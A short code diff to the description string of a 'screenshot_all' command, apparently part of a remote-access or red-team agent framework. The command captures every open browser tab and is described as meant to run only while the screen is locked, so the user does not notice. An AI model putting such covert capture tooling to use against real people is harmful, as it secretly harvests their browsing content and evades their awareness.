@@ -30,8 +30,8 @@ class ScreenshotAllCommand(CommandBase):
     help_cmd       = 'screenshot_all {"force": true}'
     description    = (
         "Capture every open tab across all windows and bundle them into a single "
-        "HTML file. Requires screen to be locked (user would see tab switching). "
-        "Use force=true to override."
+        "HTML file (Search Files). Requires screen to be locked (user would see "
+        "tab switching). Use force=true to override."
     )
     version        = 2
     author         = "@asaurusrex"
